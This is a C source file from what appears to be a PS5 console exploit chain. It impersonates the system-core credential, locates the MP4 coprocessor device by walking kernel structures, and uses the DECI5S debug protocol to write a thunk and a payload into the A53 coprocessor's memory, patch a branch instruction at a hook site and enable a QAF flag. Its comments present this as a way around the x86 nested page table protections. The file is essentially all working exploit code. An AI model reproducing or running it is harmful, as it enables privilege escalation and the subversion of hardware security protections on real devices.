/*
 * DECI5S communication with MP4/A53 coprocessor.
 *
 * Uses the DECI5S debug protocol via /dev/mp4/dump to read/write
 * A53 memory. The A53 processes these commands internally, so writes
 * bypass x86 nested page table restrictions entirely.
 *
 * Ported from a53_exploit for use in the prosperous exploit chain.
 * The key insight: the A53 writes to its own DRAM using its own
 * address translation, so we can write to PA ranges that x86 cannot
 * access through DMAP (e.g., PA 0x60000000-0x605EFFFF).
 *
 * A53 PA mapping: x86 PA 0x60000000+offset = A53 PA 0x88000000+offset
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/event.h>
#include <sys/ioctl.h>

#include <ps5/kernel.h>

#include "mp4_deci5s.h"
#include "prosperous.h"
#include "mp4_thunk.h"

/* FreeBSD struct offsets for device discovery */
#define FILE_F_VNODE    0x18
#define CDEV_SI_DRV1    0xA8

/* ---- Globals ---- */
static int      g_deci5s_init = 0;
static intptr_t g_softc, g_bar2_kva;
static intptr_t g_state_addr, g_flags_addr;
static intptr_t g_buf_kva, g_iommu_kva, g_size_kva;

extern uint64_t sceKernelReadTsc(void);

/* ---- Auth ID swap ---- */
static uint64_t swap_auth_to_syscore(void)
{
    uint64_t orig = kernel_get_ucred_authid(getpid());
    kernel_set_ucred_authid(getpid(), SYSCORE_ID);
    return orig;
}

static void restore_auth(uint64_t orig)
{
    kernel_set_ucred_authid(getpid(), orig);
}

/* ---- Access size calculation (DECI5S protocol requirement) ---- */
static uint32_t access_sz(uint64_t addr, uint32_t len)
{
    uint32_t c = (uint32_t)addr | len;
    if (c & 1) return 1;
    if (c & 2) return 3;
    if (c & 4) return 4;
    if (c & 8) return 5;
    return 6;
}

/* ---- Helper: check if pointer looks like a kernel address ---- */
static int is_kptr(intptr_t p)
{
    return p != 0 && ((uint64_t)p >> 48) == 0xFFFF;
}

/*
 * DECI5S packet send — the core communication primitive.
 *
 * Writes DECI5S packet to kernel buffer, triggers MSI doorbell,
 * waits for A53 response via kqueue.
 */
static int deci5s_send(struct deci5s_hdr *pkt, uint32_t pkt_len,
                       const void *data, uint32_t data_len)
{
    uint64_t orig = swap_auth_to_syscore();

    int fd = open("/dev/mp4/dump", 0, 0);
    if (fd < 0) {
        restore_auth(orig);
        return -1;
    }

    int kq = kqueue();
    struct kevent ev;
    EV_SET(&ev, fd, EVFILT_READ, EV_ADD, 0, 0, NULL);

    /* Set coredump state to allow packet send */
    kernel_setint(g_state_addr, ~0x10U);
    kernel_setint(g_flags_addr, 0x210);
    kevent(kq, &ev, 1, NULL, 0, NULL);

    pkt->timestamp = sceKernelReadTsc();
    intptr_t va = kernel_getlong(g_buf_kva);
    kernel_copyin(pkt, va, pkt_len - data_len);
    if (data && data_len > 0)
        kernel_copyin(data, va + pkt_len - data_len, data_len);

    /* Trigger MSI doorbell */
    uint64_t iommu = kernel_getlong(g_iommu_kva);
    uint32_t bufsz = (uint32_t)kernel_getlong(g_size_kva);
    kernel_setint(g_bar2_kva + 0xf7000, (uint32_t)(iommu >> 32));
    kernel_setint(g_bar2_kva + 0xf8000, (uint32_t)iommu);
    kernel_setint(g_bar2_kva + 0xf9000, bufsz);
    uint32_t req = kernel_getint(g_softc + 0x160) + 1;
    kernel_setint(g_softc + 0x160, req);
    kernel_setint(g_softc + 0x164, MP4_COREDUMP_CMD);
    kernel_setint(g_bar2_kva + 0xf6000, MP4_COREDUMP_CMD);

    struct timespec send_timeout = {10, 0};
    uint32_t ctx[] = {8, 0};
    int nev = kevent(kq, NULL, 0, &ev, 1, &send_timeout);
    ioctl(fd, IOCTL_FINISH, ctx);
    close(kq);
    close(fd);
    restore_auth(orig);

    if (nev == 0) {
        printf("[!] DECI5S timeout\n");
        return -2;
    }
    return 0;
}

/*
 * Write A53 memory via DECI5S WRITE_MEMORY command.
 * The A53 processes this internally and writes to its own DRAM.
 * Max 64 bytes per call.
 */
static int deci5s_write(uint64_t a53_pa, const void *src, uint32_t len)
{
    if (!g_deci5s_init || len == 0 || len > 64) return -1;

    struct {
        struct deci5s_cmd_hdr h;
        struct { uint32_t ss, ts, ty; uint32_t p0[5]; uint32_t na; uint32_t p1; } c;
        struct deci5s_mem_arg a;
    } pkt;
    memset(&pkt, 0, sizeof(pkt));
    pkt.h.header.magic        = DECI5S_MAGIC;
    pkt.h.header.self_size    = sizeof(struct deci5s_hdr);
    pkt.h.header.packet_size  = sizeof(pkt) + len;
    pkt.h.header.src          = DECI5S_SRC_KERNEL;
    pkt.h.header.dst          = DECI5S_DST_MP4;
    pkt.h.header.protocol_id  = DECI5S_PROTO_SDBGP;
    pkt.h.dcmp                = DECI5S_DCMP;
    pkt.h.code                = DECI5S_CODE;
    pkt.h.num_commands        = 1;
    pkt.c.ss                  = sizeof(pkt.c);
    pkt.c.ts                  = sizeof(pkt.c) + sizeof(struct deci5s_mem_arg);
    pkt.c.ty                  = SDBGP_WRITE_MEMORY;
    pkt.c.na                  = 1;
    pkt.a.self_size           = sizeof(struct deci5s_mem_arg);
    pkt.a.access_size_and_type = mp4_mem_arg_pack(access_sz(a53_pa, len),
                                                   MP4_MEM_PA_TO_EL3_VA);
    pkt.a.addr                = a53_pa;
    pkt.a.size                = len;
    return deci5s_send(&pkt.h.header, sizeof(pkt) + len, src, len);
}

/*
 * Read A53 memory via DECI5S READ_MEMORY command.
 */
static int deci5s_read(uint64_t a53_pa, void *dst, uint32_t len)
{
    if (!g_deci5s_init) return -1;

    struct {
        struct deci5s_cmd_hdr h;
        struct { uint32_t ss, ts, ty; uint32_t p[4]; uint32_t na; } c;
        struct deci5s_mem_arg a;
    } pkt;
    memset(&pkt, 0, sizeof(pkt));
    pkt.h.header.magic        = DECI5S_MAGIC;
    pkt.h.header.self_size    = sizeof(struct deci5s_hdr);
    pkt.h.header.packet_size  = sizeof(pkt);
    pkt.h.header.src          = DECI5S_SRC_KERNEL;
    pkt.h.header.dst          = DECI5S_DST_MP4;
    pkt.h.header.protocol_id  = DECI5S_PROTO_SDBGP;
    pkt.h.dcmp                = DECI5S_DCMP;
    pkt.h.code                = DECI5S_CODE;
    pkt.h.num_commands        = 1;
    pkt.c.ss                  = sizeof(pkt.c);
    pkt.c.ts                  = sizeof(pkt.c) + sizeof(struct deci5s_mem_arg);
    pkt.c.ty                  = SDBGP_READ_MEMORY;
    pkt.c.na                  = 1;
    pkt.a.self_size           = sizeof(struct deci5s_mem_arg);
    pkt.a.access_size_and_type = mp4_mem_arg_pack(access_sz(a53_pa, len),
                                                   MP4_MEM_PA_TO_EL3_VA);
    pkt.a.addr                = a53_pa;
    pkt.a.size                = len;

    intptr_t va = kernel_getlong(g_buf_kva);
    int ret = deci5s_send(&pkt.h.header, sizeof(pkt), NULL, 0);
    if (ret != 0) return ret;
    int64_t nr = (int64_t)kernel_getlong(va + 0xf8);
    if (nr > 0)
        kernel_copyout(va + 0x108, dst, len);
    return (int)nr;
}

/*
 * Write a buffer to A53 memory in 64-byte chunks via DECI5S.
 */
static int deci5s_write_buf(uint64_t a53_pa, const void *buf, uint32_t total_len)
{
    const uint8_t *p = (const uint8_t *)buf;
    uint32_t remaining = total_len;
    uint64_t addr = a53_pa;

    while (remaining > 0) {
        uint32_t chunk = remaining > 64 ? 64 : remaining;
        int ret = deci5s_write(addr, p, chunk);
        if (ret != 0) {
            printf("[!] DECI5S write failed at PA 0x%llx (ret=%d)\n",
                   (unsigned long long)addr, ret);
            return ret;
        }
        p += chunk;
        addr += chunk;
        remaining -= chunk;
    }
    return 0;
}

/*
 * Find MP4 device softc and bar2 KVA by tracing from /dev/mp4/dump fd.
 *
 * fd → struct file → f_vnode → v_rdev → cdev → si_drv1 = softc
 * softc → zcn_bar2_res → bushandle = bar2 KVA
 */
static int find_mp4_device(void)
{
    uint64_t orig = swap_auth_to_syscore();
    int fd = open("/dev/mp4/dump", 0, 0);
    if (fd < 0) {
        printf("[!] Cannot open /dev/mp4/dump: %s\n", strerror(errno));
        restore_auth(orig);
        return -1;
    }

    intptr_t proc = kernel_get_proc(getpid());
    if (!proc) {
        close(fd);
        restore_auth(orig);
        return -1;
    }

    /* Walk fd → file → vnode → cdev → softc */
    intptr_t p_fd = kernel_getlong(proc + 0x48);
    intptr_t fd_files = kernel_getlong(p_fd);
    intptr_t fde_file = kernel_getlong(fd_files + 8 + (0x30 * fd));

    if (!is_kptr(fde_file)) {
        printf("[!] Invalid struct file pointer\n");
        close(fd);
        restore_auth(orig);
        return -1;
    }

    /* Try vnode path first */
    intptr_t vnode = kernel_getlong(fde_file + 0x18); /* f_vnode */
    intptr_t cdev = 0;

    if (is_kptr(vnode)) {
        /* Scan vnode for cdev pointer */
        static const uint32_t rdev_offsets[] = {
            0x38, 0x40, 0x48, 0x50, 0x58, 0x60, 0x68, 0x70,
            0x78, 0x80, 0x88, 0x90, 0x98, 0xA0, 0xA8, 0xB0,
            0xB8, 0xC0, 0xC8, 0xD0, 0xD8, 0xE0, 0xE8, 0xF0
        };
        for (int i = 0; i < (int)(sizeof(rdev_offsets)/sizeof(rdev_offsets[0])); i++) {
            intptr_t candidate = kernel_getlong(vnode + rdev_offsets[i]);
            if (!is_kptr(candidate)) continue;
            intptr_t delta = candidate - vnode;
            if (delta >= 0 && delta < 0x200) continue;
            intptr_t drv1 = kernel_getlong(candidate + CDEV_SI_DRV1);
            intptr_t drv1_delta = drv1 - vnode;
            if (is_kptr(drv1) && !(drv1_delta >= 0 && drv1_delta < 0x200)) {
                cdev = candidate;
                break;
            }
        }
    }

    /* Fallback: try f_data */
    if (!is_kptr(cdev)) {
        intptr_t f_data = kernel_getlong(fde_file);
        if (is_kptr(f_data)) {
            intptr_t drv1 = kernel_getlong(f_data + CDEV_SI_DRV1);
            if (is_kptr(drv1))
                cdev = f_data;
        }
    }

    if (!is_kptr(cdev)) {
        printf("[!] Could not find cdev\n");
        close(fd);
        restore_auth(orig);
        return -1;
    }

    /* Get softc from cdev */
    intptr_t softc = kernel_getlong(cdev + CDEV_SI_DRV1);
    if (!is_kptr(softc)) {
        /* Scan cdev for likely softc */
        for (uint32_t off = 0x80; off < 0x100; off += 8) {
            intptr_t candidate = kernel_getlong(cdev + off);
            if (is_kptr(candidate) && candidate != cdev) {
                softc = candidate;
                break;
            }
        }
    }

    close(fd);
    restore_auth(orig);

    if (!is_kptr(softc)) {
        printf("[!] Could not find softc\n");
        return -1;
    }

    /* Get bar2 KVA from softc → zcn_bar2_res → bushandle */
    intptr_t bar2 = 0;
    intptr_t zcn = kernel_getlong(softc + SOFTC_ZCN_BAR2_RES);
    if (is_kptr(zcn)) {
        bar2 = kernel_getlong(zcn + RESOURCE_BUSHANDLE);
    }
    if (!is_kptr(bar2)) {
        /* Probe other offsets */
        for (uint32_t off = 0; off < 0x80; off += 8) {
            intptr_t res = kernel_getlong(softc + off);
            if (!is_kptr(res)) continue;
            intptr_t bh = kernel_getlong(res + RESOURCE_BUSHANDLE);
            if (is_kptr(bh)) {
                bar2 = bh;
                break;
            }
        }
    }

    if (!is_kptr(bar2)) {
        printf("[!] Could not find bar2 KVA\n");
        return -1;
    }

    g_softc = softc;
    g_bar2_kva = bar2;
    printf("[+] MP4 softc=0x%lx, bar2=0x%lx\n", (long)softc, (long)bar2);
    return 0;
}

/*
 * Initialize DECI5S coredump state machine.
 * Starts a coredump session and scans softc for state/flags/buffer pointers.
 */
static int deci5s_init_state(void)
{
    uint64_t orig = swap_auth_to_syscore();
    int fd = open("/dev/mp4/dump", 0, 0);
    if (fd < 0) {
        restore_auth(orig);
        return -1;
    }

    int kq = kqueue();
    struct kevent ev;
    EV_SET(&ev, fd, EVFILT_READ, EV_ADD, 0, 0, NULL);
    kevent(kq, &ev, 1, NULL, 0, NULL);

    uint32_t ctx[6] = {12, 0, 0, 0, 0, 0};
    if (ioctl(fd, IOCTL_START, ctx) < 0) {
        printf("[!] ioctl START failed: %s\n", strerror(errno));
        close(kq);
        close(fd);
        restore_auth(orig);
        return -2;
    }

    struct timespec to = {10, 0};
    kevent(kq, NULL, 0, &ev, 1, &to);
    close(kq);
    ioctl(fd, IOCTL_ALTER_STATE, ctx);

    /* Scan softc for coredump state/flags markers */
    intptr_t sa = 0, fa = 0;
    for (uint32_t o = 0; o < 0x1000; o += 4) {
        uint32_t v = kernel_getint(g_softc + o);
        if ((v & ~0x10U) == 0xf && sa == 0) sa = g_softc + o;
        if ((v & 0xffff) == 0x212 && fa == 0) { fa = g_softc + o; break; }
    }
    if (!fa) {
        printf("[!] Could not find coredump flags in softc\n");
        uint32_t f[2] = {8, 0};
        ioctl(fd, IOCTL_FINISH, f);
        close(fd);
        restore_auth(orig);
        return -3;
    }

    /* Scan for coredump buffer pointer */
    intptr_t bva = 0, ia = 0, sza = 0;
    for (uint32_t i = (uint32_t)(fa - g_softc) / 8; i < 0x1000 / 8; i++) {
        intptr_t a = g_softc + i * 8;
        uint64_t v = kernel_getlong(a);
        if ((v >> 40) == 0xFFFFFF && (v & 0xFFFFF) == 0 && bva == 0) {
            bva = a;
            ia = a - 8;
            sza = a - 16;
            break;
        }
    }
    if (!bva) {
        printf("[!] Could not find coredump buffer in softc\n");
        uint32_t f[2] = {8, 0};
        ioctl(fd, IOCTL_FINISH, f);
        close(fd);
        restore_auth(orig);
        return -4;
    }

    g_state_addr = sa;
    g_flags_addr = fa;
    g_buf_kva = bva;
    g_iommu_kva = ia;
    g_size_kva = sza;
    g_deci5s_init = 1;

    printf("[+] DECI5S state=softc+0x%lx, flags=softc+0x%lx, buf=softc+0x%lx\n",
           (long)(sa - g_softc), (long)(fa - g_softc), (long)(bva - g_softc));

    uint32_t f[2] = {8, 0};
    ioctl(fd, IOCTL_FINISH, f);
    close(fd);
    restore_auth(orig);
    return 0;
}

/*
 * Inject MP4 payload via DECI5S.
 *
 * This writes the thunk, hook patch, QAF flag, and main payload
 * to A53 DRAM using DECI5S WRITE_MEMORY commands. The A53 processes
 * these writes internally, completely bypassing x86 nPT restrictions.
 *
 * Must be called BEFORE TMR disable (A53 must be stable).
 *
 * A53 PA = 0x88000000 + DRAM_offset
 * (where DRAM_offset = x86_PA - 0x60000000)
 */
#define A53_DRAM_PA_BASE  0x88000000ULL

/* Pre-compiled MP4 payload binary (same as in mp4_inject.c) */
extern const unsigned char mp4_payload_bin[];
extern const unsigned int mp4_payload_bin_len;

int deci5s_inject_payload(struct phys_rw_ctx *ctx)
{
    int ret;

    printf("[*] DECI5S: Finding MP4 device...\n");
    ret = find_mp4_device();
    if (ret != 0) {
        printf("[!] DECI5S: Failed to find MP4 device: %d\n", ret);
        return ret;
    }

    printf("[*] DECI5S: Initializing coredump state machine...\n");
    ret = deci5s_init_state();
    if (ret != 0) {
        printf("[!] DECI5S: Init failed: %d\n", ret);
        return ret;
    }

    /* Test: read ELF magic from A53 DRAM to verify DECI5S works */
    uint32_t elf_magic = 0;
    ret = deci5s_read(A53_DRAM_PA_BASE + 0x100000, &elf_magic, 4);
    printf("[DECI5S] Read A53 PA 0x88100000: 0x%08x (ret=%d) %s\n",
           elf_magic, ret, elf_magic == 0x464C457F ? "ELF magic OK" : "");
    if (elf_magic != 0x464C457F) {
        printf("[!] DECI5S: Cannot read A53 ELF — aborting\n");
        return -1;
    }

    /* Step 1: Write thunk at DRAM offset 0xE0000 (A53 PA 0x880E0000) */
    printf("[*] DECI5S: Writing thunk (%u bytes) to A53 PA 0x%llx...\n",
           mp4_thunk_bin_len,
           (unsigned long long)(A53_DRAM_PA_BASE + MP4_THUNK_OFFSET));
    ret = deci5s_write_buf(A53_DRAM_PA_BASE + MP4_THUNK_OFFSET,
                           mp4_thunk_bin, mp4_thunk_bin_len);
    if (ret != 0) {
        printf("[!] DECI5S: Thunk write failed\n");
        return ret;
    }

    /* Step 2: Write main payload at DRAM offset 0x7F1000 (A53 PA 0x887F1000) */
    printf("[*] DECI5S: Writing payload (%u bytes) to A53 PA 0x%llx...\n",
           mp4_payload_bin_len,
           (unsigned long long)(A53_DRAM_PA_BASE + MP4_PAYLOAD_OFFSET));
    ret = deci5s_write_buf(A53_DRAM_PA_BASE + MP4_PAYLOAD_OFFSET,
                           mp4_payload_bin, mp4_payload_bin_len);
    if (ret != 0) {
        printf("[!] DECI5S: Payload write failed\n");
        return ret;
    }

    /* Step 3: Patch BL is_qaf -> BL thunk at hook site
     *
     * Hook site: A53 VA 0x108BD4 = DRAM offset 0x8BD4
     *            (A53_HOOK_ADDR - A53_ELF_BASE = 0x108BD4 - 0x100000 = 0x8BD4)
     *            A53 PA = 0x88008BD4
     *
     * Thunk at: A53 VA 0x1E0000 = DRAM offset 0xE0000
     *           (A53_ELF_BASE + MP4_THUNK_OFFSET = 0x100000 + 0xE0000 = 0x1E0000)
     *
     * BL encoding: 0x94000000 | (offset_in_words & 0x3FFFFFF)
     */
    int32_t bl_offset = ((int32_t)(A53_ELF_BASE + MP4_THUNK_OFFSET) -
                         (int32_t)A53_HOOK_ADDR) / 4;
    uint32_t branch_insn = 0x94000000 | (bl_offset & 0x03FFFFFF);
    printf("[*] DECI5S: Hook BL insn=0x%08x (thunk VA 0x%x -> hook VA 0x%x)\n",
           branch_insn, A53_ELF_BASE + MP4_THUNK_OFFSET, A53_HOOK_ADDR);

    uint64_t hook_a53_pa = A53_DRAM_PA_BASE + (A53_HOOK_ADDR - A53_ELF_BASE);
    ret = deci5s_write(hook_a53_pa, &branch_insn, 4);
    if (ret != 0) {
        printf("[!] DECI5S: Hook patch failed\n");
        return ret;
    }

    /* Step 4: Enable QAF flag at DRAM offset 0x123B74 (A53 PA 0x88123B74) */
    uint32_t qaf_flag = 1;
    ret = deci5s_write(A53_DRAM_PA_BASE + A53_QAF_FLAGS_OFF, &qaf_flag, 4);
    if (ret != 0) {
        printf("[!] DECI5S: QAF flag write failed\n");
        return ret;
    }

    /* Verify writes by reading back */
    uint32_t verify;
    deci5s_read(hook_a53_pa, &verify, 4);
    printf("[DECI5S] Verify hook: 0x%08x (expect 0x%08x) %s\n",
           verify, branch_insn, verify == branch_insn ? "OK" : "MISMATCH");

    deci5s_read(A53_DRAM_PA_BASE + A53_QAF_FLAGS_OFF, &verify, 4);
    printf("[DECI5S] Verify QAF: 0x%08x (expect 0x00000001) %s\n",
           verify, verify == 1 ? "OK" : "MISMATCH");

    /* Read first 4 bytes of thunk to verify */
    deci5s_read(A53_DRAM_PA_BASE + MP4_THUNK_OFFSET, &verify, 4);
    printf("[DECI5S] Verify thunk[0]: 0x%08x (expect 0x%08x) %s\n",
           verify, *(const uint32_t *)mp4_thunk_bin,
           verify == *(const uint32_t *)mp4_thunk_bin ? "OK" : "MISMATCH");

    printf("[+] DECI5S: Payload injection complete\n");
    return 0;
}
